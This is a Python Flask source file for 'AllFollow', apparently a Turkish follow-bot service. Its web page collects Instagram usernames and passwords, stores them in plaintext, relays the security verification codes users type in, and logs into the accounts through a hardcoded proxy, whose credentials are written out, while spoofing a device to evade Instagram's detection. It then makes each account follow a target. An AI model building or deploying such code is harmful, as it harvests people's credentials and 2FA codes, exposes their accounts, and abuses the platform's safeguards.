import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "final-boss-v65"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(200), default="Hazırlanıyor...")

def bot_logic(cl, u):
    try:
        # Takip edilecek hedef
        cl.user_follow(cl.user_id_from_username("instagram"))
        print(f"✅ Bot Görevi Tamamlandı: {u}")
    except Exception as e:
        print(f"⚠️ Takip Hatası: {e}")

def login_worker(u, p):
    with app.app_context():
        cl = Client()
        # Instagram'ı kandırmak için rastgele cihaz kimliği:
        cl.set_device_settings({
            "app_version": "269.0.0.18.75",
            "android_version": 26,
            "android_release": "8.0.0",
            "dpi": "480dpi",
            "resolution": "1080x1920",
            "manufacturer": "Samsung",
            "device": "SM-G950F",
            "model": "dreamlte",
            "cpu": "exynos8895",
            "version_code": "443233155"
        })
        
        if PROXY_URL:
            cl.set_proxy(PROXY_URL)
        
        clients[u] = cl
        acc = IGAccount.query.filter_by(username=u).first()
        
        try:
            print(f"🚀 {u} için giriş denemesi başlatıldı...")
            cl.login(u, p)
            acc.status = "OK"
            db.session.commit()
            bot_logic(cl, u)
        except ChallengeRequired:
            acc.status = "KOD_LAZIM"
            db.session.commit()
        except BadPassword:
            acc.status = "YANLIS_SIFRE"
            db.session.commit()
        except Exception as e:
            # Hata mesajını veritabanına yaz ki neden çalışmadığını gör
            acc.status = f"ENGEL: {str(e)[:50]}"
            db.session.commit()
            print(f"❌ Kritik Hata: {e}")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    if not u or not p: return jsonify(status="error")
    
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="Baglaniyor...")
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Baglaniyor..."
    db.session.commit()
    
    threading.Thread(target=login_worker, args=(u, p)).start()
    return jsonify(status="started")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    if cl:
        try:
            cl.challenge_set_code(code)
            with app.app_context():
                acc = IGAccount.query.filter_by(username=u).first()
                acc.status = "OK"
                db.session.commit()
            threading.Thread(target=bot_logic, args=(cl, u)).start()
            return jsonify(status="success")
        except: return jsonify(status="fail")
    return jsonify(status="no_client")

# --- UI (HTML) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-white font-sans">
    <div id="login-p" class="p-8 mt-20 max-w-sm mx-auto border border-zinc-800 rounded-3xl bg-zinc-900 shadow-2xl">
        <h1 class="text-3xl font-black italic text-center mb-8">ALLFOLLOW</h1>
        <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none">
        <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none">
        <button onclick="baglan()" id="btn" class="w-full p-4 bg-purple-600 rounded-xl font-bold active:scale-95 transition-all">BAŞLAT</button>
    </div>

    <div id="main-p" class="hidden fixed inset-0 bg-white text-black p-6">
        <div class="bg-purple-600 p-8 rounded-3xl text-white text-center shadow-lg">
            <h2 id="st-text" class="text-2xl font-black italic animate-pulse">SİSTEME BAĞLANILIYOR</h2>
        </div>
        <div id="v-area" class="hidden mt-6 p-6 bg-red-50 border-2 border-red-200 rounded-2xl text-center">
            <p class="text-red-600 font-bold mb-4">GÜVENLİK KODUNU GİRİN</p>
            <input id="vcode" class="w-full p-4 text-center text-3xl border rounded-xl mb-4 outline-none">
            <button onclick="onayla()" class="w-full bg-red-600 text-white py-4 rounded-xl font-bold">ONAYLA</button>
        </div>
        <div class="mt-10 p-4 border rounded-2xl flex justify-between items-center">
            <span id="usr-id" class="font-bold"></span>
            <span class="text-xs text-gray-400">DURUMU TAKİP ET</span>
        </div>
    </div>

    <script>
        let curr = "";
        function baglan() {
            curr = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            fetch('/api/connect', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:curr, p:p})});
            document.getElementById('login-p').style.display = 'none';
            document.getElementById('main-p').style.display = 'block';
            document.getElementById('usr-id').innerText = "@" + curr;
            setInterval(check, 3000);
        }
        async function check() {
            const r = await fetch('/api/status/' + curr);
            const d = await r.json();
            const t = document.getElementById('st-text');
            const v = document.getElementById('v-area');
            t.innerText = d.status;
            if(d.status === "OK") { t.classList.remove('animate-pulse'); t.style.background = "#22c55e"; v.classList.add('hidden'); }
            if(d.status === "KOD_LAZIM") v.classList.remove('hidden');
        }
        function onayla() {
            const c = document.getElementById('vcode').value;
            fetch('/api/verify', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:curr, code:c})});
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
